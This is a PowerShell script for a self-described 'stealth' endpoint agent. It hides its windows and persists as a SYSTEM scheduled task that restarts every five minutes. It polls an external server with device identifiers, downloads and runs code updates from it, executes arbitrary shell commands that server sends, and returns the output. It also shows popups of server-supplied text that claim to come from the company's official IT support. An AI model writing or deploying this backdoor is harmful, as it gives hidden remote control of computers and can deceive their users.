param(
    $ServerUrl = "https://unified-manager.vercel.app"
)

# Unified Enterprise Agent (UEA)
# Version: 1.4.9
# Description: Professional stealth endpoint agent with premium Support GUI.

$ProgressPreference = 'SilentlyContinue' # CRITICAL: Prevents console flickering during web calls
$ErrorActionPreference = "Stop"

# Ghost-Killer: Absolute Silence
Get-CimInstance Win32_Process | Where-Object { $_.CommandLine -like "*unified-agent.ps1*" -and $_.ProcessId -ne $PID } | ForEach-Object { 
    Stop-Process -Id $_.ProcessId -Force -ErrorAction SilentlyContinue 
}

$InstallDir = "$env:ProgramData\UnifiedAgent"
$LogFile = "$InstallDir\agent.log"
$ScriptPath = "$InstallDir\unified-agent.ps1"
$ConfigPath = "$InstallDir\config.json"
$SupportLogo = "https://img.icons8.com/color/96/000000/it-support.png"

function Log-Message {
    param($Message)
    $Timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    $Line = "[$Timestamp] $Message"
    if ($LogFile) {
        try {
            if (-not (Test-Path (Split-Path $LogFile))) { New-Item -ItemType Directory -Path (Split-Path $LogFile) -Force | Out-Null }
            $Line | Out-File -FilePath $LogFile -Append -ErrorAction Stop
        } catch {}
    }
}

function Install-StealthAgent {
    $IsAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")
    if (-not $IsAdmin) { return }

    Log-Message "Installing/Repairing Stealth Persistence (v1.4.8)..."
    if (-not (Test-Path $InstallDir)) { New-Item -ItemType Directory -Path $InstallDir -Force | Out-Null }
    
    # Save Config
    $Config = @{ ServerUrl = $ServerUrl; Version = "1.4.8" }
    $Config | ConvertTo-Json | Out-File -FilePath $ConfigPath -Force

    # Stealth Wrapper (VBS)
    $VbsMainPath = "$InstallDir\uea_stealth.vbs"
    $VbsMainCode = "CreateObject(`"WScript.Shell`").Run `"powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"`"$ScriptPath`"`"`", 0, False"
    $VbsMainCode | Out-File -FilePath $VbsMainPath -Force -Encoding ascii

    # Scheduled Task (SYSTEM)
    $Action = New-ScheduledTaskAction -Execute "wscript.exe" -Argument "`"$VbsMainPath`""
    $Trigger1 = New-ScheduledTaskTrigger -AtStartup
    $Trigger2 = New-ScheduledTaskTrigger -Once -At (Get-Date) -RepetitionInterval (New-TimeSpan -Minutes 5)
    $Principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
    $Settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable
    
    Unregister-ScheduledTask -TaskName "UnifiedEnterpriseAgent" -Confirm:$false -ErrorAction SilentlyContinue | Out-Null
    Register-ScheduledTask -TaskName "UEA_Persistence" -Action $Action -Trigger @($Trigger1, $Trigger2) -Principal $Principal -Settings $Settings -Force | Out-Null
    Log-Message "Persistence Re-registered."
}

try {
    # 1. Self-Identification
    $AgentId = try { (Get-CimInstance Win32_ComputerSystemProduct -ErrorAction SilentlyContinue).UUID } catch { "$($env:COMPUTERNAME)-$(Get-Random)" }
    $SerialNumber = try { (Get-CimInstance Win32_Bios -ErrorAction SilentlyContinue).SerialNumber } catch { "Unknown" }
    $Version = "1.4.9"
    
    # 2. Persistence Check
    $TaskExists = Get-ScheduledTask -TaskName "UEA_Persistence" -ErrorAction SilentlyContinue
    if (($PSCommandPath -ne $ScriptPath) -or (-not $TaskExists)) {
        if ($PSCommandPath -and $PSCommandPath -ne $ScriptPath) {
            if (-not (Test-Path $InstallDir)) { New-Item -ItemType Directory -Path $InstallDir -Force | Out-Null }
            Copy-Item -Path $PSCommandPath -Destination $ScriptPath -Force
        }
        Install-StealthAgent
    }

    # 3. Load Server URL from local config if it exists
    if (Test-Path $ConfigPath) {
        $SavedConfig = try { Get-Content $ConfigPath | ConvertFrom-Json } catch { $null }
        if ($SavedConfig -and $SavedConfig.ServerUrl) { $ServerUrl = $SavedConfig.ServerUrl }
    }

    Log-Message "Agent v$Version Started. Context: $(whoami)"

    # 4. Main Loop
    while ($true) {
        try {
            $Response = Invoke-RestMethod -Method Post -Uri "$ServerUrl/api/agent/heartbeat" -Body (ConvertTo-Json @{
                agentId = $AgentId
                serialNumber = $SerialNumber
                version = $Version
                status = "online"
                deviceName = $env:COMPUTERNAME
                localIp = try { (Get-NetIPAddress -AddressFamily IPv4 | Where-Object { $_.InterfaceAlias -notlike "*Loopback*" -and $_.IPv4Address -notlike "169.254*" } | Select-Object -First 1).IPv4Address } catch { "Unknown" }
                lastSeen = (Get-Date -Format "yyyy-MM-dd HH:mm:ss")
            }) -ContentType "application/json"

            # Version Upgrade Logic
            if ($Response.latestVersion -and ([version]$Response.latestVersion -gt [version]$Version)) {
                Log-Message "Found newer version: $($Response.latestVersion). Upgrading..."
                Invoke-WebRequest -Uri "$ServerUrl/api/agent/update" -OutFile "$ScriptPath" -UseBasicParsing | Out-Null
                Install-StealthAgent
                
                # Silent Restart
                $VbsRestart = "$InstallDir\restart.vbs"
                "CreateObject(`"WScript.Shell`").Run `"powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"`"$ScriptPath`"`"`", 0, False" | Out-File -FilePath $VbsRestart -Force -Encoding ascii
                Start-Process "wscript.exe" -ArgumentList "`"$VbsRestart`""
                Stop-Process -Id $PID
            }

            foreach ($cmd in $Response.commands) {
                try {
                    $Result = ""
                    if ($cmd.type -eq "Message") {
                        $msgContent = $cmd.payload.message
                        $PopupScript = "$InstallDir\popup.ps1"
                        
                        # Premium C# GUI Generator
                        $PopupCode = @"
Add-Type -AssemblyName System.Windows.Forms, System.Drawing
[System.Windows.Forms.Application]::EnableVisualStyles()

`$Form = New-Object Windows.Forms.Form
`$Form.Text = 'Equinox IT Support'
`$Form.Size = New-Object Drawing.Size(520,300)
`$Form.StartPosition = 'CenterScreen'
`$Form.TopMost = `$true
`$Form.FormBorderStyle = 'FixedDialog'
`$Form.MaximizeBox = `$false
`$Form.MinimizeBox = `$false
`$Form.BackColor = [System.Drawing.Color]::White

# Logo
`$IconBox = New-Object Windows.Forms.PictureBox
`$IconBox.Size = New-Object Drawing.Size(80, 80)
`$IconBox.Location = New-Object Drawing.Point(20, 30)
`$IconBox.SizeMode = 'StretchImage'
try { 
    `$Web = New-Object System.Net.WebClient
    `$ImgBytes = `$Web.DownloadData('$SupportLogo')
    `$IconBox.Image = [System.Drawing.Image]::FromStream((New-Object IO.MemoryStream(`$ImgBytes, 0, `$ImgBytes.Length)))
} catch { }

# Header
`$Header = New-Object Windows.Forms.Label
`$Header.Text = 'EQUINOX IT SUPPORT'
`$Header.ForeColor = [System.Drawing.Color]::FromArgb(0, 120, 215)
`$Header.Font = New-Object Drawing.Font('Segoe UI', 12, [System.Drawing.FontStyle]::Bold)
`$Header.Location = New-Object Drawing.Point(120, 30)
`$Header.Size = New-Object Drawing.Size(350, 25)

# Disclaimer
`$Disclaimer = New-Object Windows.Forms.Label
`$Disclaimer.Text = 'IMPORTANT: This communication is from your official company IT Support team.'
`$Disclaimer.Font = New-Object Drawing.Font('Segoe UI', 8, [System.Drawing.FontStyle]::Italic)
`$Disclaimer.ForeColor = [System.Drawing.Color]::DarkSlateGray
`$Disclaimer.Location = New-Object Drawing.Point(120, 55)
`$Disclaimer.Size = New-Object Drawing.Size(350, 15)

# Message Content
`$Content = New-Object Windows.Forms.Label
`$Content.Text = @"
$msgContent
"@
`$Content.Font = New-Object Drawing.Font('Segoe UI', 11)
`$Content.Location = New-Object Drawing.Point(120, 85)
`$Content.Size = New-Object Drawing.Size(360, 100)

`$Button = New-Object Windows.Forms.Button
`$Button.Text = 'Acknowledge & Dismiss'
`$Button.Font = New-Object Drawing.Font('Segoe UI', 10, [System.Drawing.FontStyle]::Bold)
`$Button.Size = New-Object Drawing.Size(180, 45)
`$Button.Location = New-Object Drawing.Point(300, 200)
`$Button.BackColor = [System.Drawing.Color]::FromArgb(0, 120, 215)
`$Button.ForeColor = [System.Drawing.Color]::White
`$Button.FlatStyle = 'Flat'
`$Button.Add_Click({ 
    try {
        `$Ts = Get-Date -Format 'yyyy-MM-dd HH:mm:ss'
        Invoke-RestMethod -Method Post -Uri "$ServerUrl/api/agent/result" -Body (@{ agentId = '$AgentId'; type = 'Message-Ack'; data = "Verified support message acknowledged at `$Ts" } | ConvertTo-Json) -ContentType 'application/json'
    } catch { }
    `$Form.Close() 
})

`$Form.Controls.AddRange(@(`$IconBox, `$Header, `$Disclaimer, `$Content, `$Button))
`$Form.ShowDialog() | Out-Null
"@
                        $PopupCode | Out-File -FilePath $PopupScript -Force -Encoding utf8
                        
                        # Trigger Popup Stealthily in User Session
                        $ActiveUser = (Get-CimInstance Win32_ComputerSystem).UserName
                        if ($ActiveUser) {
                            $VbsPopupPath = "$InstallDir\popup_stealth.vbs"
                            "CreateObject(`"WScript.Shell`").Run `"powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"`"$PopupScript`"`"`", 0, False" | Out-File -FilePath $VbsPopupPath -Force -Encoding ascii
                            
                            $TaskName = "UEA_Support_$(Get-Random)"
                            $Action = New-ScheduledTaskAction -Execute "wscript.exe" -Argument "`"$VbsPopupPath`""
                            $Principal = New-ScheduledTaskPrincipal -UserId $ActiveUser -LogonType Interactive
                            Register-ScheduledTask -TaskName $TaskName -Action $Action -Principal $Principal -Force | Out-Null
                            Start-ScheduledTask -TaskName $TaskName | Out-Null
                            Start-Sleep -Seconds 5
                            Unregister-ScheduledTask -TaskName $TaskName -Confirm:$false | Out-Null
                            $Result = "Professional IT Support Dialog delivered to $ActiveUser"
                        }
                    } elseif ($cmd.type -eq "shell") {
                        $Result = powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -WindowStyle Hidden -Command $cmd.payload.command 2>&1 | Out-String
                    }

                    if ($Result) {
                        Invoke-RestMethod -Method Post -Uri "$ServerUrl/api/agent/result" -Body (ConvertTo-Json @{ agentId = $AgentId; commandId = $cmd.id; result = $Result }) -ContentType "application/json" | Out-Null
                    }
                } catch { Log-Message "Command Error: $($_.Exception.Message)" }
            }
        } catch { } # Silent heartbeats
        Start-Sleep -Seconds 3
    }
} catch { Log-Message "Fatal: $($_.Exception.Message)" }
